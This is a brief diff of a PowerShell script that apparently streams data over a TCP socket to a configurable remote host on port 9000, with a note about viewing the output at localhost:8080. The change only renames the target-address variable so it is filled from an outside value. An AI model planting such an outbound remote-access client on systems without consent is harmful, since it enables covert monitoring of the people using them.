@@ -16,7 +16,7 @@ Then in a firefox browser goto  > http://localhost:8080
 #>
 
 #================================ CHANGE THESE ===============================
-$IP = "IP_ADDRESS_OR_DOMAIN_HERE"
+$IPA = "$ip"
 $PORT = "9000"
 #=============================================================================
 
@@ -25,7 +25,7 @@ try{
     Add-Type -AssemblyName System.Windows.Forms
     [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
     $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
-    $socket.Connect($IP,$PORT)
+    $socket.Connect($IPA,$PORT)
 
     function SendResponse($sock, $string){
         if ($sock.Connected){
